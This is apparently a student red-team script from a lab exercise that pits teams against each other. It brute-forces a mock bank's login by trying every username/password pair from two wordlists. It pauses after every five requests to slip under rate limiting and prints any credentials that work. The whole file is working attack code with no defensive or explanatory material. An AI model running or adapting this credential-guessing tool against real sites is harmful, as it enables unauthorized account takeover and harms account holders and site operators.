import requests
import time
url = "http://blue.uscbank4.usc430"
matched_username = ''
matched_password = ''
match_found = False
count_request = 0
with open('usernames.txt', 'r') as usernames_file:
    usernames = usernames_file.readlines()

with open('passwords.txt', 'r') as passwords_file:
    passwords = passwords_file.readlines()

for user in usernames:
    for password in passwords:
        if count_request == 5:
            time.sleep(5)
            count_request = 0

        login = requests.get(url, params={"user": user, "pass": password})
        count_request += 1

        if login.text == "Login Successful": # condition need to change as per Opposite Blue Team's successful login response message
            matched_username = user
            matched_password = password
            match_found = True
            break

    if match_found:
        break

if match_found:
    print("Matching username and password found!")
    print("Matched username: " + matched_username.strip())
    print("Matched password: " + matched_password.strip())
else:
    print("No matching username and password found.")  
